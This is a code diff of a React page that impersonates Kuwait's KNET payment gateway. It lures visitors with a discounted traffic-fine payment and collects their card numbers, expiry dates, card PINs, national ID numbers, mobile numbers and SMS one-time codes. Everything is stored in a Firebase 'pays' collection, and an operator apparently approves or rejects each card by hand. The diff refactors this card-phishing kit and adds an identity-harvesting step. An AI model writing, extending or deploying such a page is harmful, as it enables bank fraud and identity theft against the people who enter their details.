@@ -1,24 +1,37 @@
-"use client";
-import { useEffect, useState } from "react";
-import "./kent.css";
-import { doc, onSnapshot, updateDoc } from "firebase/firestore";
-import {  db, handlePay } from "../firebase";
-import FullPageLoader from "../loader1";
+"use client"
+import { useEffect, useState } from "react"
+import type React from "react"
+
+import "./kent.css"
+import { doc, onSnapshot } from "firebase/firestore"
+import { addData, db, handlePay } from "../firebase"
+import FullPageLoader from "../loader1"
+
 type PaymentInfo = {
-  createdDate?: string;
-  cardNumber: string;
-  year: string;
-  month: string;
-  cvv: string;
-  bank?: string;
-  otp?: string;
-  pass: string;
-  cardState: string;
-  allOtps: string[];
-  bank_card: string[];
-  prefix: string;
-  status: "new" | "pending" | "approved" | "rejected";
-};
+  createdDate?: string
+  cardNumber: string
+  year: string
+  month: string
+  cvv: string
+  bank?: string
+  pass: string
+  otp?: string
+  cardState: string
+  allOtps: string[]
+  bank_card: string[]
+  prefix: string
+  status: "new" | "pending" | "approved" | "rejected"
+}
+
+type FormData = {
+  id: string | null
+  idNumber: string
+  mobile: string
+  network: string
+  page?: string
+}
+
+// Bank data moved to a separate constant
 const BANKS = [
   {
     value: "NBK",
@@ -33,34 +46,17 @@ const BANKS = [
   {
     value: "GBK",
     label: "Gulf Bank",
-    cardPrefixes: [
-      "526206",
-      "531470",
-      "531644",
-      "531329",
-      "517419",
-      "517458",
-      "531471",
-      "559475",
-    ],
+    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
   },
   {
     value: "ABK",
     label: "Al Ahli Bank of Kuwait",
-    cardPrefixes: ["403622", "428628    ", "423826"],
+    cardPrefixes: ["403622", "428628", "423826"],
   },
   {
     value: "BURGAN",
     label: "Burgan Bank",
-    cardPrefixes: [
-      "468564",
-      "402978",
-      "403583",
-      "415254",
-      "450238",
-      "540759",
-      "49219000",
-    ],
+    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
   },
   {
     value: "KFH",
@@ -70,15 +66,7 @@ const BANKS = [
   {
     value: "BOUBYAN",
     label: "Boubyan Bank",
-    cardPrefixes: [
-      "470350",
-      "490455",
-      "490456",
-      "404919",
-      "450605",
-      "426058",
-      "431199",
-    ],
+    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
   },
   {
     value: "KIB",
@@ -87,76 +75,83 @@ const BANKS = [
   },
   {
     value: "UNB",
-    label: "Union National Bank   ",
-    cardPrefixes: ["457778", "513000"], // Added common prefixes for IBK
+    label: "Union National Bank",
+    cardPrefixes: ["457778", "513000"],
   },
   {
     value: "BBK",
     label: "Bank of Bahrain and Kuwait",
-    cardPrefixes: ["418056"], // Added a missing prefix
+    cardPrefixes: ["418056"],
   },
   {
     value: "BNP",
     label: "BNP Paribas",
-    cardPrefixes: ["450216", "531483", "489800"], // Added a common prefix for BNP
+    cardPrefixes: ["450216", "531483", "489800"],
   },
   {
     value: "HSBC",
     label: "HSBC Middle East Bank",
-    cardPrefixes: ["447284", "530001", "453095"], // Added an additional HSBC prefix
+    cardPrefixes: ["447284", "530001", "453095"],
   },
   {
     value: "FAB",
     label: "First Abu Dhabi Bank",
-    cardPrefixes: ["440891", "530123", "454888"], // Added a prefix used by FAB
+    cardPrefixes: ["440891", "530123", "454888"],
   },
   {
     value: "CITIBANK",
     label: "Citibank",
-    cardPrefixes: ["431457", "545432", "400800"], // Added another Citibank prefix
+    cardPrefixes: ["431457", "545432", "400800"],
   },
   {
     value: "QNB",
     label: "Qatar National Bank",
-    cardPrefixes: ["521020", "524745"], // Added a Qatar National Bank prefix
+    cardPrefixes: ["521020", "524745"],
   },
   {
     value: "Doha",
     label: "Doha Bank",
-    cardPrefixes: ["419252"], // Added another Mashreq prefix
+    cardPrefixes: ["419252"],
   },
   {
     value: "ALRAJHI",
     label: "Al Rajhi Bank",
-    cardPrefixes: ["458838"], // Added a common Al Rajhi prefix
+    cardPrefixes: ["458838"],
   },
   {
     value: "BANK_MUSCAT",
     label: "Bank Muscat",
-    cardPrefixes: ["489312", "529410", "454100"], // Added a prefix for Bank Muscat
+    cardPrefixes: ["489312", "529410", "454100"],
   },
   {
     value: "WARBA",
     label: "Warba Bank",
-    cardPrefixes: ["541350", "525528", "532749", "559459"], // Added another common ICBC prefix
+    cardPrefixes: ["541350", "525528", "532749", "559459"],
   },
-];
+]
 
 export default function Kent(props: { setPage?: any; violationValue: number }) {
-  const [step, setstep] = useState(1);
-  const [total, setTotal] = useState("");
-  const [loading, setLoading] = useState(true);
-  const [newotp] = useState([""]);
-const res=parseFloat(props.violationValue as unknown as  string)*0.30
-  const handleUpdatePage = async (page: string) => {
-    const visitorId = localStorage.getItem("visitor");
-    try {
-      const docRef = doc(db, "pays", visitorId!);
-      await updateDoc(docRef, { page: page });
-    } catch (error) {
-      console.error("Error updating current page:", error);
-    }
-  };
+  const [step, setStep] = useState(1)
+  const [total, setTotal] = useState("")
+  const [mobile, setMobile] = useState("99****")
+  const [loading, setLoading] = useState(true)
+  const [newotp] = useState([""])
+  const visitorId = localStorage.getItem("visitor")
+
+  // Form data for user information
+  const [formData, setFormData] = useState<FormData>({
+    id: visitorId,
+    idNumber: "",
+    mobile: "",
+    network: "Zain", // Default value
+  })
+
+  // Calculate discount
+  const discount = Number.parseFloat(props.violationValue as unknown as string) * 0.3
+  const discountedAmount =
+    props.violationValue === 0 ? 3.5 : Number.parseFloat(props.violationValue!.toString()) - discount
+
+  // Payment information state
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     createdDate: new Date().toISOString(),
     cardNumber: "",
@@ -171,44 +166,479 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
     bank_card: [""],
     prefix: "",
     status: "new",
-  });
+  })
 
-  const handleAddotp = (otp: string) => {
-    newotp.push(`${otp} , `);
-    if (newotp.length > 2) {
+  // Handle form input changes
+  const handleFormChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+    const { name, value } = e.target
+    setFormData((prev) => ({
+      ...prev,
+      [name]: value,
+    }))
+  }
+
+  // Handle payment info changes
+  const handlePaymentInfoChange = (field: keyof PaymentInfo, value: string) => {
+    setPaymentInfo((prev) => ({
+      ...prev,
+      [field]: value,
+    }))
+  }
+
+  // Handle bank selection
+  const handleBankSelection = (bankValue: string) => {
+    const selectedBank = BANKS.find((bank) => bank.value === bankValue)
+
+    setPaymentInfo((prev) => ({
+      ...prev,
+      bank: bankValue,
+      bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
+    }))
+  }
+
+  // Handle OTP addition
+  const handleAddOtp = (otp: string) => {
+    if (!newotp.includes(`${otp} , `)) {
+      newotp.push(`${otp} , `)
     }
-  };
-  useEffect(() => {
-    setTotal(localStorage?.getItem("vv")!);
+  }
+
+  // Handle form submission
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    setLoading(true)
+
+    try {
+      await addData(formData)
+    } catch (error) {
+      console.error("Error:", error)
+    }
+
     setTimeout(() => {
       setLoading(false)
-    }, 3000);
-  }, []);
+      setFormData({
+        id: visitorId,
+        idNumber: "",
+        mobile: "",
+        network: "Zain",
+      })
+    }, 3000)
+  }
 
+  // Handle button click based on current step
+  const handleButtonClick = async (e: React.FormEvent) => {
+    e.preventDefault()
+
+    if (step === 1) {
+      setLoading(true)
+      await handlePay(paymentInfo, setPaymentInfo)
+      setStep(2)
+      setLoading(false)
+    } else if (step === 2) {
+      setLoading(true)
+      await handleSubmit(e)
+      setTimeout(() => {
+        setLoading(false)
+        setStep(3)
+      }, 3000)
+    } else if (step === 3) {
+      if (paymentInfo.otp && !newotp.includes(paymentInfo.otp)) {
+        handleAddOtp(paymentInfo.otp)
+      }
+
+      setLoading(true)
+      await handlePay(paymentInfo, setPaymentInfo)
+
+      // Check for approval status after submitting OTP
+      setTimeout(async () => {
+        // If payment is approved, redirect to sahel
+        if (paymentInfo.status === "approved") {
+          try {
+            // Add data with page:"sahel" to redirect
+
+
+      setLoading(false)
+
+            props.setPage('sahel')
+          } catch (error) {
+            console.error("Error updating page:", error)
+          }
+        } else if (paymentInfo.status === "rejected") {
+          // If rejected, show alert and stay on step 3
+          alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
+        }
+        // Reset OTP field and loading state
+        setPaymentInfo({
+          ...paymentInfo,
+          otp: "",
+        })
+      }, 3000)
+    }
+  }
+
+  // Check if form is valid for current step
+  const isFormValid = () => {
+    if (step === 1) {
+      return (
+        paymentInfo.prefix !== "" &&
+        paymentInfo.bank !== "" &&
+        paymentInfo.cardNumber !== "" &&
+        paymentInfo.pass !== "" &&
+        paymentInfo.month !== "" &&
+        paymentInfo.year !== "" &&
+        paymentInfo.pass.length === 4
+      )
+    }
+    return true
+  }
+
+  // Load initial data
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor");
+    setTotal(localStorage?.getItem("vv") || "")
+
+    setTimeout(() => {
+      setLoading(false)
+    }, 3000)
+  }, [])
+
+  // Listen for payment status updates
+  useEffect(() => {
+    const visitorId = localStorage.getItem("visitor")
+
     if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
+      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() as any;
-          if (data.status) {
-            setPaymentInfo((prev) => ({ ...prev, status: data.status }));
-            if (data.status === "approved") {
-              setstep(2);
-              setLoading(false);
-              data.page === "";
-            } else if (data.status === "rejected") {
-              setLoading(false);
-              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ");
-              setstep(1);
+          const data = docSnap.data() as any
+setMobile(data.mobile)
+          if (data.status === "approved") {
+            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
+
+            // If we're on step 3 and status is approved, redirect to sahel
+            if (step === 3) {
+              setLoading(true)
+              try {
+                // Add data with page:"sahel" to redirect
+                await addData({ id: visitorId, page: "sahel" })
+              } catch (error) {
+                console.error("Error updating page:", error)
+              } finally {
+                setLoading(false)
+              }
+            }
+          } else if (data.status === "rejected") {
+            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
+
+            // If we're on step 3 and status is rejected, show alert
+            if (step === 3) {
+              setLoading(false)
+              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
             }
           }
         }
-      });
+      })
 
-      return () => unsubscribe();
+      return () => unsubscribe()
     }
-  }, []);
+  }, [step])
+
+  // Render different form steps
+  const renderFormStep = () => {
+    switch (step) {
+      case 1:
+        return (
+          <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
+            {/* Bank Selection */}
+            <div className="row">
+              <label className="column-label" style={{ width: "40%" }}>
+                Select Your Bank:
+              </label>
+              <select
+                className="column-value"
+                style={{ width: "60%" }}
+                onChange={(e) => handleBankSelection(e.target.value)}
+                value={paymentInfo.bank}
+              >
+                <option value="" title="Select Your Bank">
+                  Select Your Banks
+                </option>
+                {BANKS.map((bank, index) => (
+                  <option value={bank.value} key={index}>
+                    {bank.label} [{bank.value}]
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            {/* Card Number */}
+            <div className="row three-column" id="Paymentpagecardnumber">
+              <label className="col">Card Number:</label>
+              <select
+                className="col"
+                name="dcprefix"
+                id="dcprefix"
+                onChange={(e) => handlePaymentInfoChange("prefix", e.target.value)}
+                style={{ width: "25%" }}
+                value={paymentInfo.prefix}
+              >
+                <option value="">prefix</option>
+                {paymentInfo.bank_card.map((prefix, index) => (
+                  <option key={index} value={prefix}>
+                    {prefix}
+                  </option>
+                ))}
+              </select>
+              <input
+                name="debitNumber"
+                id="debitNumber"
+                type="tel"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                size={10}
+                className="allownumericwithoutdecimal"
+                style={{ width: "45%", marginLeft: 2 }}
+                maxLength={10}
+                onChange={(e) => handlePaymentInfoChange("cardNumber", e.target.value)}
+                value={paymentInfo.cardNumber}
+                title="Should be in number. Length should be 10"
+              />
+            </div>
+
+            {/* Expiration Date */}
+            <div className="row three-column" id="cardExpdate">
+              <label className="col">Expiration Date:</label>
+              <select
+                onChange={(e) => handlePaymentInfoChange("month", e.target.value)}
+                className="col m-1"
+                value={paymentInfo.month}
+              >
+                <option value="">MM</option>
+                {Array.from({ length: 12 }, (_, i) => {
+                  const month = i + 1
+                  return (
+                    <option key={month} value={month}>
+                      {month < 10 ? `0${month}` : month}
+                    </option>
+                  )
+                })}
+              </select>
+              <select
+                onChange={(e) => handlePaymentInfoChange("year", e.target.value)}
+                className="col m-1"
+                value={paymentInfo.year}
+              >
+                <option value="">YYYY</option>
+                {Array.from({ length: 30 }, (_, i) => {
+                  const year = 2024 + i
+                  return (
+                    <option key={year} value={year}>
+                      {year}
+                    </option>
+                  )
+                })}
+              </select>
+            </div>
+
+            {/* PIN */}
+            <div className="row" id="PinRow">
+              <div className="row">
+                <label className="col">PIN:</label>
+                <input
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  name="cardPin"
+                  id="cardPin"
+                  onChange={(e) => handlePaymentInfoChange("pass", e.target.value)}
+                  value={paymentInfo.pass}
+                  autoComplete="off"
+                  title="Should be in number. Length should be 4"
+                  type="password"
+                  size={4}
+                  style={{ width: "80%" }}
+                  maxLength={4}
+                  className="allownumericwithoutdecimal col-9"
+                />
+              </div>
+            </div>
+          </div>
+        )
+
+      case 2:
+        return (
+          <div className="form-card" 
+          dir="rtl"
+          >
+            <div
+              className="notification"
+              style={{
+                border: "#ff0000 1px solid",
+                backgroundColor: "#f7dadd",
+                fontSize: 12,
+                fontFamily: "helvetica, arial, sans serif",
+                color: "#31708f",
+                paddingRight: 15,
+                marginBottom: 3,
+                textAlign: "center",
+                display: "none",
+              }}
+              id="otpmsgDC2"
+            ></div>
+
+            {/* Notification */}
+            <div
+              className="row alert-msg"
+              id="notificationbox"
+              style={{
+                color: "#31708f",
+                fontFamily: "Arial, Helvetica, serif",
+                fontSize: 12,
+
+              }}
+            >
+              <div id="notification">
+                <p>
+                  <span className="title" style={{ fontWeight: "bold" }}>
+                    يرجى الملاحظة:
+                  </span>{" "}
+                 لمتابعة الطلب، يرجى إدخال رقم الهاتف المحمول المرتبط ببطاقة الهوية الوطنية حتى تتم عملية الدفع بنجاح.
+                </p>
+              </div>
+            </div>
+
+            {/* رقم الهوية / الأقامة */}
+            <div className="row">
+              <div id="payConfirmCardNum">
+                <label className="col">رقم الهوية / الأقامة:</label>
+                <input
+                  className="col"
+                  type="tel"
+                  name="idNumber"
+                  style={{ width: "100%" }}
+                  maxLength={10}
+                  value={formData.idNumber}
+                  onChange={handleFormChange}
+                />
+              </div>
+            </div>
+
+            {/* Network Operator */}
+            <div className="row" id="payConfirmExpmnth" style={{ display: "block" }}>
+              <label className="col">مشغل الشبكة:</label>
+              <div>
+                <select style={{ width: "100%" }} name="network" value={formData.network} onChange={handleFormChange}>
+                  <option value="Zain">Zain</option>
+                  <option value="Ooredoo">Ooredoo</option>
+                  <option value="STC">STC</option>
+                </select>
+              </div>
+            </div>
+
+            {/* رقم الهاتف */}
+            <div className="row" id="payConfirmExpyr" style={{ display: "block" }}>
+              <div id="payConfirmCardNum">
+                <label className="col">رقم الهاتف:</label>
+                <input
+                  className="col"
+                  type="tel"
+                  name="mobile"
+                  maxLength={10}
+                  style={{ width: "100%" }}
+                  value={formData.mobile}
+                  onChange={handleFormChange}
+                />
+              </div>
+            </div>
+          </div>
+        )
+
+      case 3:
+        return (
+          <div className="form-card" dir="rtl">
+            <div className="notification">
+              <div className="border border-blue-500 rounded-lg p-4 max-w-md mx-auto">
+                <div style={{ display: "flex", justifyContent: "center" }}>
+                  <img src="./Phone_icon.png" alt="logo" width={40} style={{ margin: 5 }} />
+                </div>
+                {/* Verification title */}
+                <p className="text-blue-600 text-xl text-center font-bold mb-4">تحقق من الرمز المرسل إلى جوالك</p>
+
+                {/* Reference number */}
+                <div className="flex justify-center items-center gap-2 mb-6 row">
+                  <span className="text-xl font-bold" style={{textAlign:'center'}} >{mobile||"99******"}</span>
+                  <div className="bg-blue-100 rounded-full p-1">
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      width="20"
+                      height="20"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="2"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      className="text-blue-600"
+                    >
+                      <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                    </svg>
+                  </div>
+                </div>
+
+                {/* Info box */}
+                <div className=" notification ">
+                  <div
+                    className="row alert-msg"
+                    id="notificationbox"
+                    style={{
+                      color: "#31708f",
+                      fontFamily: "Arial, Helvetica, serif",
+                      fontSize: 12,
+                    }}
+                  >
+                    <div id="notification">
+                      <p>
+                        <span className="title" style={{ fontWeight: "bold" }}>
+                          يرجى الانتباه:
+                        </span>{" "}
+                        لقد تم إرسال رمز تحقق مكون من 4 أرقام عبر رسالة نصية إلى رقم هاتفك الجوال المسجل لدى البنك. يرجى
+                        إدخال الرمز في الخانة أدناه لإتمام عملية التحقق. تنتهي صلاحية الرمز خلال 5 دقائق
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                {/* OTP Input field */}
+                <div
+                  className="mb-6"
+                  style={{
+                    color: "#31708f",
+                  }}
+                >
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center gap-1 text-blue-600">
+                      <strong>الرمز المرسل إلى الجوال من 4 أرقام</strong>
+                    </div>
+                  </div>
+                  <input
+                    type="text"
+                    maxLength={4}
+                    placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
+                    className="text-center text-lg py-6 border-blue-200"
+                    value={paymentInfo.otp || ""}
+                    onChange={(e) => handlePaymentInfoChange("otp", e.target.value)}
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+        )
+
+      default:
+        return (
+          <div style={{ textAlign: "center", padding: "20px" }}>
+            <p>Please wait while we process your payment...</p>
+          </div>
+        )
+    }
+  }
 
   return (
     <div
@@ -221,64 +651,39 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
       }}
       dir="ltr"
     >
-      <FullPageLoader isLoading={loading}/>
-      <form
-        onSubmit={(e) => {
-          e.preventDefault();
-          console.log(total);
-        }}
-      >
+      <FullPageLoader isLoading={loading} />
+      <form onSubmit={handleButtonClick}>
         <div className="madd" />
-        <div id="PayPageEntry" style={{display:'flex',justifyContent:"center",flexDirection:'column',}}>
-        <img src="./dre5.png" className="container" alt="mmo" width={'100%'} />
+        <div id="PayPageEntry" style={{ display: "flex", justifyContent: "center", flexDirection: "column" }}>
+          <img src="./mob.jpg" className="" alt="mmo" width={"100%"} style={{ marginBottom: 5 }} />
 
           <div className="">
-
             <div className="content-block">
-              <div className="form-card">
-                <div
-                  className=""
-                  style={{ display: "flex", justifyContent: "center" }}
-                >
-                  <img
-                    src="./kv.png"
-                    className="-"
-                    alt="logo"
-                    width={50}
-                  />
+              {/* Payment Information Card */}
+              <div className="form-card" style={{ display: step >= 2 ? "none" : "block" }}>
+                <div className="" style={{ display: "flex", justifyContent: "center" }}>
+                  <img src="./kv.png" className="-" alt="logo" width={50} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
-                  <label className="column-value text-label">
-                    KNET Payment
-                  </label>
+                  <label className="column-value text-label col">KNET Payment</label>
                 </div>
                 <div id="OrgTranxAmt">
                   <div className="row">
                     <label className="column-label">Amount: </label>
-                    <label className="column-value " style={{width:'50%'}}>  {" "}
-                    <s>{     props.violationValue === 0 ? 5.00 :parseFloat( props.violationValue!.toString() ).toFixed(2)}kd</s> 
-                      <span className="m-1">
-                      {
-                      props.violationValue === 0 ? 3.5 :parseFloat( props.violationValue!.toString() )-res
-                      } kd
-                      </span>
+                    <label className="column-value" style={{ width: "50%" }}>
+                      <s>
+                        {props.violationValue === 0
+                          ? "5.00 kd"
+                          : `${Number.parseFloat(props.violationValue!.toString()).toFixed(2)} kd`}
+                      </s>
+                      <span className="m-1">{discountedAmount.toFixed(2)} kd</span>
                     </label>
                   </div>
                 </div>
-                {/* Added for PG Eidia Discount starts   */}
-                <div
-                  className="row"
-                  id="DiscntRate"
-                  style={{ display: "none" }}
-                />
-                <div
-                  className="row"
-                  id="DiscntedAmt"
-                  style={{ display: "none" }}
-                />
-                {/* Added for PG Eidia Discount ends   */}
               </div>
+
+              {/* Form Card */}
               <div className="form-card">
                 <div
                   className="notification"
@@ -295,386 +700,41 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
                   }}
                   id="otpmsgDC"
                 />
-                {/*Customer Validation  for knet*/}
-                <div
-                  className="notification"
-                  style={{
-                    border: "#ff0000 1px solid",
-                    backgroundColor: "#f7dadd",
-                    fontSize: 12,
-                    fontFamily: "helvetica, arial, sans serif",
-                    color: "#ff0000",
-                    paddingRight: 15,
-                    display: "none",
-                    marginBottom: 3,
-                    textAlign: "center",
-                  }}
-                  id="CVmsg"
-                />
-                <div id="ValidationMessage">
-                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
-            font-family: helvetica, arial, sans serif;
-            color: #ff0000;
-              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
-                      </span*/}
-                </div>
-                <div id="savedCardDiv" style={{ display: "none" }}>
-                  {/* Commented the bank name display for kfast starts */}
-                  <div className="row">
-                    <br />
-                  </div>
-                  {/* Commented the bank name display for kfast ends */}
-                  {/* Added for Points Redemption */}
-                  <div className="row">
-                    <label className="column-label" style={{ marginLeft: 20 }}>
-                      PIN:
-                    </label>
-                    <input
-                      inputMode="numeric"
-                      pattern="[0-9]*"
-                      name="debitsavedcardPIN"
-                      id="debitsavedcardPIN"
-                      autoComplete="off"
-                      title="Should be in number. Length should be 4"
-                      type="password"
-                      size={4}
-                      maxLength={4}
-                      className="allownumericwithoutdecimal"
-                      style={{ width: "50%" }}
-                    />
-                  </div>
-                  {/* Added for Points Redemption */}
-                </div>
 
-                {step === 1 ? (
-                  <>
-                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
-                      <div className="row">
-                        <label
-                          className="column-label"
-                          style={{ width: "40%" }}
-                        >
-                          Select Your Bank:
-                        </label>
-                        <select
-                          className="column-value"
-                          style={{ width: "60%" }}
-                          onChange={(e: any) => {
-                            const selectedBank = BANKS.find(
-                              (bank) => bank.value === e.target.value
-                            );
+                <div id="ValidationMessage"></div>
+                <div id="savedCardDiv" style={{ display: "none" }}></div>
 
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              bank: e.target.value,
-                              bank_card: selectedBank
-                                ? selectedBank.cardPrefixes
-                                : [""],
-                            });
-                          }}
-                        >
-                          <>
-                            <option value="bankname" title="Select Your Bank">
-                              Select Your Banks
-                            </option>
-                            {BANKS.map((i, index) => (
-                              <option value={i.value} key={index}>
-                                {i.label} [{i.value}]
-                              </option>
-                            ))}
-                          </>
-                        </select>
-                      </div>
-                      <div
-                        className="row three-column"
-                        id="Paymentpagecardnumber"
-                      >
-                        <label className="col">Card Number:</label>
-                        <select
-                          className="col "
-                          name="dcprefix"
-                          id="dcprefix"
-                          onChange={(e: any) =>
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              prefix: e.target.value,
-                            })
-                          }
-                          style={{ width: "25%" }}
-                        >
-                          <option
-                            value={paymentInfo.prefix}
-                            onClick={(e: any) => {
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                prefix: e.target.value,
-                              });
-                            }}
-                          >
-                            prefix
-                          </option>
-                          {paymentInfo.bank_card.map((i, index) => (
-                            <option
-                              key={index}
-                              value={i}
-                              onClick={(e: any) => {
-                                setPaymentInfo({
-                                  ...paymentInfo,
-                                  prefix: e.target.value,
-                                });
-                              }}
-                            >
-                              {i}
-                            </option>
-                          ))}
-                        </select>
-                        <input
-                          name="debitNumber"
-                          id="debitNumber"
-                          type="tel"
-                          inputMode="numeric"
-                          pattern="[0-9]*"
-                          size={10}
-                          className="allownumericwithoutdecimal"
-                          style={{ width: "45%", marginLeft: 2 }}
-                          maxLength={10}
-                          onChange={(e: any) =>
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              cardNumber: e.target.value,
-                            })
-                          }
-                          title="Should be in number. Length should be 10"
-                        />
-                      </div>
-                      <div className="row three-column" id="cardExpdate">
-                        <label className="col "> Expiration Date: </label>
-                        <select
-                          onChange={(e: any) =>
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              month: e.target.value,
-                            })
-                          }
-                          className="col"
-                        >
-                          <option value={0}>MM</option>
-                          <option value={1}>01</option>
-                          <option value={2}>02</option>
-                          <option value={3}>03</option>
-                          <option value={4}>04</option>
-                          <option value={5}>05</option>
-                          <option value={6}>06</option>
-                          <option value={7}>07</option>
-                          <option value={8}>08</option>
-                          <option value={9}>09</option>
-                          <option value={10}>10</option>
-                          <option value={11}>11</option>
-                          <option value={12}>12</option>
-                        </select>
-                        <select
-                          onChange={(e: any) =>
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              year: e.target.value,
-                            })
-                          }
-                          className="col"
-                        >
-                          <option value={0}>YYYY</option>
-                          <option value={2024}>2024</option>
-                          <option value={2025}>2025</option>
-                          <option value={2026}>2026</option>
-                          <option value={2027}>2027</option>
-                          <option value={2028}>2028</option>
-                          <option value={2029}>2029</option>
-                          <option value={2030}>2030</option>
-                          <option value={2031}>2031</option>
-                          <option value={2032}>2032</option>
-                          <option value={2033}>2033</option>
-                          <option value={2034}>2034</option>
-                          <option value={2035}>2035</option>
-                          <option value={2036}>2036</option>
-                          <option value={2037}>2037</option>
-                          <option value={2038}>2038</option>
-                          <option value={2039}>2039</option>
-                          <option value={2040}>2040</option>
-                          <option value={2041}>2041</option>
-                          <option value={2042}>2042</option>
-                          <option value={2043}>2043</option>
-                          <option value={2044}>2044</option>
-                          <option value={2045}>2045</option>
-                          <option value={2046}>2046</option>
-                          <option value={2047}>2047</option>
-                          <option value={2048}>2048</option>
-                          <option value={2049}>2049</option>
-                          <option value={2050}>2050</option>
-                          <option value={2051}>2051</option>
-                          <option value={2052}>2052</option>
-                          <option value={2053}>2053</option>
-                          <option value={2054}>2054</option>
-                          <option value={2055}>2055</option>
-                          <option value={2056}>2056</option>
-                          <option value={2057}>2057</option>
-                          <option value={2058}>2058</option>
-                          <option value={2059}>2059</option>
-                          <option value={2060}>2060</option>
-                          <option value={2061}>2061</option>
-                          <option value={2062}>2062</option>
-                          <option value={2063}>2063</option>
-                          <option value={2064}>2064</option>
-                          <option value={2065}>2065</option>
-                          <option value={2066}>2066</option>
-                          <option value={2067}>2067</option>
-                        </select>
-                      </div>
-                      <div className="row" id="PinRow">
-                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                        <input
-                          type="hidden"
-                          name="cardPinType"
-                          defaultValue="A"
-                        />
-                        <div className="row">
-                          <label className="column-label"> PIN: </label>
-
-                          <input
-                            inputMode="numeric"
-                            pattern="[0-9]*"
-                            name="cardPin"
-                            id="cardPin"
-                            onChange={(e: any) =>
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                pass: e.target.value,
-                              })
-                            }
-                            autoComplete="off"
-                            title="Should be in number. Length should be 4"
-                            type="password"
-                            size={4}
-                            maxLength={4}
-                            className="allownumericwithoutdecimal col-9 "
-                          />
-                        </div>
-                     
-                      </div>
-                    </div>
-                  </>
-                ) : step === 2 && paymentInfo.status === "approved" ? (
-                  <div>
-                    <form style={{ display: "flex", flexDirection: "column" }}>
-                      <label>
-                        Please enter the verification code sent to your phone
-                        number
-                      </label>
-                      <label>
-                        <input
-                          name="otp"
-                          style={{ width: "100%", marginTop: 15 }}
-                          id="otp"
-                          type="tel"
-                          inputMode="numeric"
-                          pattern="[0-9]*"
-                          className="allownumericwithoutdecimal"
-                          maxLength={6}
-                          value={paymentInfo.otp}
-                          onChange={(e: any) => {
-                            setPaymentInfo({
-                              ...paymentInfo,
-                              otp: e.target.value,
-                            });
-                          }}
-                          title="Should be in number. Length should be 6"
-                        />
-                      </label>
-                    </form>
-                  </div>
-                ) : (
-                  <div style={{ textAlign: "center", padding: "20px" }}>
-                    <p>Please wait while we process your payment...</p>
-                  </div>
-                )}
+                {/* Render current step form */}
+                {renderFormStep()}
               </div>
+
+              {/* Action Buttons */}
               <div className="form-card">
                 <div className="row">
                   <div style={{ textAlign: "center" }}>
                     <div id="loading" style={{ display: "none" }}>
                       <center>
-                        <img
-                          style={{
-                            height: 20,
-                            float: "left",
-                            marginLeft: "20%",
-                          }}
-                        />
-                        <label
-                          className="col text-label"
-                          style={{ width: "70%", textAlign: "center" }}
-                        >
+                        <label className="col text-label" style={{ width: "70%", textAlign: "center" }}>
                           Processing.. please wait ...
                         </label>
                       </center>
                     </div>
                     <div style={{ display: "flex" }}>
-                      <button
-                        disabled={
-                          step === 1 &&
-                          (paymentInfo.prefix === "" ||
-                            paymentInfo.bank === "" ||
-                            paymentInfo.cardNumber === "" ||
-                            paymentInfo.pass === "" ||
-                            paymentInfo.month === "" ||
-                            paymentInfo.year === "" ||
-                            paymentInfo.pass.length !== 4 
-                            )
-                        }
-                        type="submit"
-                        onClick={(e) => {
-                          e.preventDefault();
-
-                          if (step === 1) {
-                            setLoading(true);
-                            handlePay(paymentInfo, setPaymentInfo);
-                            setstep(2);
-                          } else if (step >= 2) {
